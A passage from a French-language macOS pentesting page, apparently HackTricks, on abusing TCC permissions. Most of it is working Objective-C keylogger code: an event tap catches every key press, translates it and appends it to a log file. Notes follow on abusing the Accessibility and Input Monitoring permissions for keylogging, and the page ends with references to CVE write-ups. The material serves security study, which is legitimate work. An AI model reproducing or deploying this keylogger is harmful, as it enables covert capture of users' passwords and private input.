// If it's not a special key, try to translate it
if (!keyString) {
UniCharCount maxStringLength = 4;
UniCharCount actualStringLength = 0;
UniChar unicodeString[maxStringLength];

TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

UInt32 deadKeyState = 0;
OSStatus status = UCKeyTranslate(keyboardLayout,
keyCode,
kUCKeyActionDown,
0,
LMGetKbdType(),
kUCKeyTranslateNoDeadKeysBit,
&deadKeyState,
maxStringLength,
&actualStringLength,
unicodeString);
CFRelease(currentKeyboard);

if (status == noErr && actualStringLength > 0) {
keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
} else {
keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
}
}

NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
AppendStringToFile(logString, kKeystrokesLogPath);
}
return event;
}

int main() {
@autoreleasepool {
CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

if (!eventTap) {
NSLog(@"Failed to create event tap");
exit(1);
}

CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
CGEventTapEnable(eventTap, true);
CFRunLoopRun();
}
return 0;
}
```
{{#endtab}}
{{#endtabs}}

> [!CAUTION] > **L’Accessibilité est une permission très puissante**, vous pourriez en abuser d’autres façons, par exemple effectuer la **keystrokes attack** simplement grâce à elle, sans avoir besoin d’appeler System Events.

> [!TIP]
> Les versions plus récentes de macOS répartissent également l’abus de session de bureau entre **Input Monitoring** (`kTCCServiceListenEvent`) et les **synthetic input** (`kTCCServicePostEvent`). Si vous avez besoin de keylogging, de screen grabs ou de raw event injection au lieu de l’automatisation AXUIElement, consultez [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).

## References

- [1] [Cisco Talos - Comment plusieurs vulnérabilités dans les applications Microsoft pour macOS ouvrent la voie au vol de permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
- [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
- [3] [Apple Developer - Demander une autorisation pour la capture de contenus multimédias sur macOS](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
- [4] [Apple Developer - Capturer du contenu HDR avec ScreenCaptureKit (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
- [5] [vsociety - CVE-2023-26818 : MacOS TCC Bypass avec Telegram à l’aide de DyLib Injection, Partie 1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
- [6] [Vicarius vsociety - CVE-2023-26818 : Exploit macOS TCC Bypass avec Telegram (Partie 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
{{#include ../../../../banners/hacktricks-training.md}}
